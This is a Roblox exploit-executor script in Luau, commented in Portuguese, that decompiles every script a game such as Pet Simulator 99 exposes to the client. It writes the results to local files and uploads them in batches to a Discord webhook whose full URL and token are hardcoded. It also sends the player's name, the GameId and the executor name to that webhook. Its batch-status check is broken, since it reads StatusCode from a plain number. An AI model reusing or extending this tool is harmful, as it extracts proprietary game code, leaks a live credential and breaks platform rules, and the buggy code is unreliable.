--!strict
--[[
    PS99 Script Dump - Extrator de TODO o codigo do jogo (Discord/local) v1.0
    Alvo: Pet Simulator 99 (qualquer jogo Roblox)
    Plataforma: Executor Mobile (Delta/Hydrogen/Arceus X/Fluxus Mobile)

    O que faz:
      [1] Varre o DataModel atras de Script / LocalScript / ModuleScript
      [2] Decompila cada um com decompile() do executor
      [3] Salva TUDO em arquivos locais (writefile) organizados por path
      [4] Envia para o Discord (anexos .lua em lotes <= 8MB)
      [5] Gera indice (paths + tamanhos + status de decompilacao)

    LIMITACOES HONESTAS:
      - Scripts SERVIDOR nao replicados: o objeto existe no cliente, mas o
        source NAO e enviado -> "[sem source no cliente]"
      - Modulos com bytecode protegido/ofuscado: decompile() retorna
        bytecode bruto ou vazio (requer desofuscacao separada)
      - A GUI criada por este script e ignorada no scan

    FIX anti-trava (padrao v1.1 do Capture):
      - decompile()/writefile()/request() rodam SOMENTE em thread de task.spawn
      - Nenhuma chamada de I/O acontece no thread principal do jogo
      - task.wait() a cada N scripts para nao congelar o frame
]]

--//==============================[ CONFIG ]==============================//--
local WEBHOOK_URL = "https://discord.com/api/webhooks/1398723880369131631/7knZsAymoHblk9BcsXYuI7XT2-8PNHkZJfFbtyLHssHqjW_pXeBQVznZ0lDHz7G9ObRI"
local WEBHOOK_NAME = "PS99 ScriptDump"
local SAVE_LOCAL = true        -- grava em arquivos via writefile (principal)
local SEND_DISCORD = true      -- envia lotes de anexos pro Discord
local ROOT_DIR = "PS99Scripts" -- pasta local de saida
local YIELD_EVERY = 5          -- task.wait() a cada N scripts (anti-freeze)

--//==============================[ 1. API COMPAT ]==============================//--
local getExecutorName = (function()
    local fn = identifyexecutor or identify_executor
    if fn then
        local ok, name = pcall(fn)
        if ok and type(name) == "string" then return name end
    end
    return "unknown"
end)()

local copy = (function()
    if setclipboard then return setclipboard end
    if toclipboard then return toclipboard end
    if set_clipboard then return set_clipboard end
    return function() end
end)()

-- decompile do executor (Delta suporta). Fallback: bytecode bruto.
local decompileFn = (function()
    if decompile then return decompile end
    if decompilefunc then return decompilefunc end
    return nil
end)()

local getBytecodeFn = (function()
    if getscriptbytecode then return getscriptbytecode end
    if getbytecode then return getbytecode end
    return nil
end)()

local reqFn = (function()
    if syn and syn.request then return syn.request end
    if request then return request end
    if http and http.request then return http.request end
    return nil
end)()

-- writefile helpers com compat de assinatura
local makefolderFn = makefolder or function() end
local writefileFn = writefile
local isfileFn = isfile or function() return false end
local listfilesFn = listfiles or function() return {} end

local function ensureFolder(path)
    if not writefileFn then return end
    pcall(function()
        local parts = {}
        for part in path:gmatch("[^/]+") do
            parts[#parts + 1] = part
            local cur = table.concat(parts, "/")
            if not isfileFn(cur .. "/__check") then
                pcall(makefolderFn, cur)
            end
        end
    end)
end

local function saveFileLocal(relPath, content)
    if not writefileFn then return false end
    ensureFolder(ROOT_DIR .. "/" .. relPath)
    local ok, err = pcall(function()
        writefileFn(ROOT_DIR .. "/" .. relPath, content)
    end)
    if not ok then
        pcall(print, "[ScriptDump] writefile falhou em " .. tostring(relPath) .. ": " .. tostring(err))
        return false
    end
    return true
end

local logBuffer = {}
local function logMsg(msg)
    msg = tostring(msg)
    table.insert(logBuffer, msg)
    if #logBuffer > 200 then table.remove(logBuffer, 1) end
    pcall(print, "[ScriptDump] " .. msg)
end

local function safeGame()
    local ok, g = pcall(function() return game end)
    return ok and g or nil
end

local function safeGetService(serviceName)
    local g = safeGame()
    if not g then return nil end
    local ok, svc = pcall(function() return g:GetService(serviceName) end)
    return ok and svc or nil
end

local function safeLocalPlayer()
    local players = safeGetService("Players")
    if not players then return nil end
    local ok, plr = pcall(function() return players.LocalPlayer end)
    return ok and plr or nil
end

--//==============================[ 2. WEBHOOK ]==============================//--
local function jsonString(s)
    s = tostring(s)
    s = s:gsub("\\", "\\\\"):gsub("\"", "\\\""):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
    s = s:gsub("[%z\1-\31]", function(c) return string.format("\\u%04x", c:byte()) end)
    return "\"" .. s .. "\""
end

local function sendSimple(content, username)
    if not reqFn then return -1 end
    local body = '{"content":' .. jsonString(content) .. ',"username":' .. jsonString(username or WEBHOOK_NAME) .. '}'
    local ok, res = pcall(function()
        return reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
    end)
    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
end

-- Multipart com MULTIPLOS anexos (ate 10 arquivos / ~8MB por mensagem)
local function sendFileMulti(msg, files)
    if not reqFn then return -1 end
    local boundary = "----PS99SD" .. tostring(os.clock()):gsub("%.", "") .. "7xK"
    local body = ""
    if msg and #tostring(msg) > 0 then
        body = body .. "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n" .. tostring(msg) .. "\r\n"
    end
    for i = 1, #files do
        body = body .. "--" .. boundary
            .. "\r\nContent-Disposition: form-data; name=\"file" .. tostring(i) .. "\"; filename=\"" .. tostring(files[i].name) .. "\""
            .. "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
            .. tostring(files[i].content)
            .. "\r\n"
    end
    body = body .. "--" .. boundary .. "--\r\n"
    local ok, res = pcall(function()
        return reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
            Body = body,
        })
    end)
    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
end

--//==============================[ 3. SCAN ]==============================//--
local ScriptClasses = {
    ["Script"] = true,
    ["LocalScript"] = true,
    ["ModuleScript"] = true,
}

-- path pai->filho legivel (contrario do getPath do dump)
local function getPathFull(inst)
    local parts = {}
    local cur = inst
    local guard = 0
    while cur and guard < 80 do
        parts[#parts + 1] = tostring(cur.Name)
        cur = cur.Parent
        guard = guard + 1
    end
    -- inverte: parte[1] era o proprio script; queremos raiz primeiro
    local rev = {}
    for i = #parts, 1, -1 do
        rev[#rev + 1] = parts[i]
    end
    return table.concat(rev, "/")
end

-- sanitiza nome para uso como arquivo (sem caracteres invalidos no Windows)
local function sanitizeFilename(name)
    local s = tostring(name)
    s = s:gsub("[/\\:*?\"<>|]", "_")
    s = s:gsub("%s+", " ")
    if #s == 0 then s = "_" end
    return s
end

local function collectScripts(onProgress)
    local found = {}
    local g = safeGame()
    if not g then return found end
    local ok, all = pcall(function() return g:GetDescendants() end)
    if not ok or not all then
        logMsg("Falha ao ler DataModel - scan pode ser parcial")
        return found
    end
    for i = 1, #all do
        local inst = all[i]
        local okProc, name = pcall(function()
            if ScriptClasses[inst.ClassName] then
                local n = tostring(inst.Name)
                if n ~= "PS99ScriptDump" then
                    found[#found + 1] = inst
                end
                return n
            end
            return nil
        end)
        if okProc and name then
            if i % YIELD_EVERY == 0 then
                onProgress(string.format("Coletando... %d/%d | scripts: %d", i, #all, #found))
                task.wait()
            end
        end
    end
    return found
end

--//==============================[ 4. PROCESSAMENTO ]==============================//--
local function decompileScript(script)
    if decompileFn then
        local ok, res = pcall(function() return decompileFn(script) end)
        if ok and type(res) == "string" and #res > 0 then
            return res, "ok"
        end
    end
    -- fallback: bytecode bruto (se o executor tiver)
    if getBytecodeFn then
        local ok, res = pcall(function() return getBytecodeFn(script) end)
        if ok and type(res) == "string" and #res > 0 then
            return res, "bytecode"
        end
    end
    return nil, "sem_source_no_cliente"
end

local function processScripts(scripts, onProgress)
    local total = #scripts
    local done = 0
    local okCount = 0
    local bytecodeCount = 0
    local emptyCount = 0
    local totalBytes = 0
    local files = {}          -- lotes prontos para envio (so decompilados ok)

    for i = 1, total do
        local script = scripts[i]
        local okProc, info = pcall(function()
            local pathFull = getPathFull(script)
            local cls = tostring(script.ClassName)
            local filename = sanitizeFilename(script.Name) .. ".lua"

            local source, status = decompileScript(script)
            if not source then
                emptyCount = emptyCount + 1
                return { name = script.Name, path = pathFull, cls = cls, status = status, bytes = 0 }
            end

            local header = "-- [" .. cls .. "] " .. tostring(script.Name) .. "\n"
                .. "-- Path: " .. pathFull .. "\n"
                .. "-- Status: " .. tostring(status) .. "\n\n"

            local content = header .. source
            local bytes = #content
            totalBytes = totalBytes + bytes

            if SAVE_LOCAL then
                saveFileLocal(pathFull .. "/" .. filename, content)
            end

            if status == "ok" then
                okCount = okCount + 1
                if SEND_DISCORD then
                    files[#files + 1] = { name = filename, content = content }
                end
            elseif status == "bytecode" then
                bytecodeCount = bytecodeCount + 1
            end

            return { name = script.Name, path = pathFull, cls = cls, status = status, bytes = bytes }
        end)
        done = done + 1
        if done % 10 == 0 then
            onProgress(string.format("Decompilando... %d/%d | ok=%d bytecode=%d vazio=%d | %d KB",
                done, total, okCount, bytecodeCount, emptyCount, math.floor(totalBytes / 1024)))
            task.wait()
        end
    end

    return {
        total = total,
        ok = okCount,
        bytecode = bytecodeCount,
        empty = emptyCount,
        totalBytes = totalBytes,
        files = files,
    }
end

--//==============================[ 5. INDICE + ENVIO ]==============================//--
-- Rate limit Discord: 10 arquivos/mensagem, ~8MB/mensagem, espera 1.2s
-- entre mensagens (limite de 5 msgs/10s por webhook).
local DISCORD_MAX_FILES = 8
local DISCORD_MAX_BYTES = 6000000  -- 6MB de folga dentro do limite de 8MB
local DISCORD_WAIT = 1.2

local function sendScriptBatches(files, onProgress)
    if not reqFn then
        logMsg("request nao suportado - envio Discord SKIPPED (so arquivos locais)")
        return 0
    end
    local sent = 0
    local batch = {}
    local batchBytes = 0
    local i = 1
    local total = #files

    local function flushBatch()
        if #batch == 0 then return end
        local msg = "**PS99 ScriptDump - lote de scripts** (" .. tostring(#batch) .. " arquivos)"
        local ok, res = pcall(function()
            return sendFileMulti(msg, batch)
        end)
        local code = -1
        if ok and res then code = tonumber(res.StatusCode) or -1 end
        if code >= 200 and code < 300 then
            sent = sent + #batch
            onProgress(string.format("Enviando... %d/%d arquivos (lote ok)", sent, total))
        else
            logMsg("Lote falhou (codigo " .. tostring(code) .. ") - arquivos ficam locais")
        end
        batch = {}
        batchBytes = 0
    end

    while i <= total do
        local f = files[i]
        local fBytes = #tostring(f.content)
        if fBytes > DISCORD_MAX_BYTES then
            -- arquivo gigante: nao cabe em nenhum lote, deixa so local
            logMsg("Arquivo grande demais para Discord: " .. tostring(f.name) .. " (" .. fBytes .. " bytes)")
            i = i + 1
        else
            if #batch > 0 and (#batch >= DISCORD_MAX_FILES or batchBytes + fBytes > DISCORD_MAX_BYTES) then
                flushBatch()
                task.wait(DISCORD_WAIT)
            end
            batch[#batch + 1] = f
            batchBytes = batchBytes + fBytes
            i = i + 1
        end
        -- flush intermediario a cada lote cheio (evita esperar o loop todo)
        if #batch >= DISCORD_MAX_FILES then
            flushBatch()
            task.wait(DISCORD_WAIT)
        end
    end
    flushBatch()
    return sent
end

local function buildIndex(stats)
    local lines = {
        "== PS99 SCRIPT DUMP - INDICE ==",
        "GameId:  " .. tostring(safeGame() and safeGame().GameId or "?"),
        "Player:  " .. tostring((safeLocalPlayer() and safeLocalPlayer().Name) or "?"),
        "Executor:" .. getExecutorName,
        "Data:    " .. os.date("%Y-%m-%d %H:%M:%S"),
        "",
        "Total scripts:   " .. tostring(stats.total),
        "Decompilados ok: " .. tostring(stats.ok),
        "Bytecode bruto:  " .. tostring(stats.bytecode),
        "Sem source:      " .. tostring(stats.empty),
        "Tamanho total:   " .. tostring(math.floor((stats.totalBytes or 0) / 1024)) .. " KB",
        "",
        "Arquivos salvos em: " .. ROOT_DIR .. "/<path>/<nome>.lua",
        "Enviados ao Discord: " .. tostring(stats.sent or 0) .. " arquivos em anexos.",
    }
    return table.concat(lines, "\n")
end

--//==============================[ 6. UI TOUCH ]==============================//--
local Players = safeGetService("Players")
local TweenService = safeGetService("TweenService")

local function makeUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "PS99ScriptDump"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999
    gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.AnchorPoint = Vector2.new(0.5, 0.5)
    bg.Position = UDim2.new(0.5, 0, 0.5, 0)
    bg.Size = UDim2.new(0, 380, 0, 320)
    bg.BackgroundColor3 = Color3.fromRGB(15, 17, 25)
    bg.BackgroundTransparency = 0.05
    bg.BorderSizePixel = 0
    bg.Parent = gui
    pcall(function()
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 14)
        corner.Parent = bg
    end)

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Size = UDim2.new(1, 0, 0, 36)
    title.Font = Enum.Font.GothamBold
    title.Text = "PS99 SCRIPT DUMP"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Parent = bg

    local status = Instance.new("TextLabel")
    status.BackgroundTransparency = 1
    status.Position = UDim2.new(0, 12, 0, 52)
    status.Size = UDim2.new(1, -24, 0, 80)
    status.Font = Enum.Font.Gotham
    status.Text = "Iniciando..."
    status.TextColor3 = Color3.fromRGB(255, 200, 80)
    status.TextSize = 14
    status.TextWrapped = true
    status.Parent = bg

    local stats = Instance.new("TextLabel")
    stats.BackgroundTransparency = 1
    stats.Position = UDim2.new(0, 12, 0, 140)
    stats.Size = UDim2.new(1, -24, 0, 90)
    stats.Font = Enum.Font.Code
    stats.Text = "aguardando scan..."
    stats.TextColor3 = Color3.fromRGB(200, 210, 230)
    stats.TextSize = 12
    stats.TextXAlignment = Enum.TextXAlignment.Left
    stats.TextYAlignment = Enum.TextYAlignment.Top
    stats.Parent = bg

    local close = Instance.new("TextButton")
    close.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
    close.Position = UDim2.new(1, -64, 0, 12)
    close.Size = UDim2.new(0, 48, 0, 36)
    close.Font = Enum.Font.GothamBold
    close.Text = "X"
    close.TextColor3 = Color3.fromRGB(255, 255, 255)
    close.TextSize = 18
    close.Parent = bg
    pcall(function()
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 10)
        corner.Parent = close
    end)
    close.Activated:Connect(function()
        gui:Destroy()
    end)

    return {
        gui = gui,
        status = status,
        stats = stats,
        setStatus = function(text, color)
            status.Text = text
            if color then status.TextColor3 = color end
        end,
        setStats = function(text)
            stats.Text = text
        end,
    }
end

local ui = (function()
    local ok, u = pcall(makeUI)
    if ok and u then return u end
    logMsg("Falha ao criar UI (" .. tostring(u) .. ") - modo headless")
    return {
        gui = nil,
        status = { Text = "headless" },
        stats = { Text = "" },
        setStatus = function(text) logMsg("[status] " .. tostring(text)) end,
        setStats = function() end,
    }
end)()

--//==============================[ 7. MAIN (thread dedicada) ]==============================//--
local function notifyError(msg, trace)
    if not reqFn then return "request nao suportado" end
    local player = safeLocalPlayer()
    local g = safeGame()
    local info = "**ERRO no PS99 ScriptDump**\n```\n"
        .. tostring(msg):sub(1, 800) .. "\n```\n**Stack:**\n```\n"
        .. tostring(trace or "n/a"):sub(1, 900) .. "\n```\n"
        .. "GameId: " .. tostring(g and g.GameId or "?")
        .. "\nPlayer: " .. tostring(player and player.Name or "?")
        .. "\nExecutor: " .. getExecutorName
    local code = sendSimple(info, WEBHOOK_NAME .. " [ERRO]")
    return "codigo " .. tostring(code)
end

local function sendTestPing()
    if not reqFn then
        logMsg("WEBHOOK: request nao suportado - ping SKIPPED")
        return
    end
    local player = safeLocalPlayer()
    local g = safeGame()
    local code = sendSimple(
        "**PS99 ScriptDump - TESTE**\nExtrator de scripts iniciado.\n"
        .. "GameId: " .. tostring(g and g.GameId or "?")
        .. "\nPlayer: " .. tostring(player and player.Name or "?")
        .. "\nExecutor: " .. getExecutorName
        .. "\nTask: " .. tostring(task ~= nil),
        WEBHOOK_NAME .. " [TESTE]"
    )
    logMsg("Ping de teste: codigo " .. tostring(code))
end

local function rootErrorHandler(err)
    logMsg("ERRO RAIZ: " .. tostring(err))
    local ok, trace = pcall(debug.traceback, tostring(err), 2)
    if not ok then trace = "sem traceback" end
    pcall(function()
        ui.setStatus("ERRO: " .. tostring(err), Color3.fromRGB(255, 80, 80))
    end)
    pcall(notifyError, err, trace)
    return nil
end

local function safeSpawn(fn)
    local run = function()
        xpcall(fn, function(err)
            rootErrorHandler(err)
            return nil
        end)
    end
    if task and task.spawn then
        task.spawn(run)
    else
        run()
    end
end

local function mainFlow()
    sendTestPing()
    ui.setStatus("Coletando scripts...", Color3.fromRGB(255, 200, 80))

    local scripts = collectScripts(function(msg)
        ui.setStatus(msg, Color3.fromRGB(255, 200, 80))
    end)

    if #scripts == 0 then
        ui.setStatus("Nenhum script encontrado - jogo carregou?",
            Color3.fromRGB(255, 120, 80))
        return
    end

    ui.setStatus("Decompilando " .. tostring(#scripts) .. " scripts...",
        Color3.fromRGB(255, 200, 80))

    local stats = processScripts(scripts, function(msg)
        ui.setStatus(msg, Color3.fromRGB(255, 200, 80))
        ui.setStats(msg)
    end)

    -- envio dos lotes em thread dedicada (NUNCA no thread do jogo)
    task.spawn(function()
        task.wait(0.3)
        stats.sent = sendScriptBatches(stats.files or {}, function(msg)
            ui.setStatus(msg, Color3.fromRGB(255, 200, 80))
        end)
        local index = buildIndex(stats)
        ui.setStats(index)
        ui.setStatus("Concluido! ok=" .. tostring(stats.ok)
            .. " bytecode=" .. tostring(stats.bytecode)
            .. " sem_source=" .. tostring(stats.empty),
            Color3.fromRGB(80, 230, 120))
        task.wait(0.2)
        local c = sendFileMulti(index, {})
        logMsg("Indice enviado (codigo " .. tostring(c) .. ")")
        copy(index)
    end)
end

safeSpawn(mainFlow)
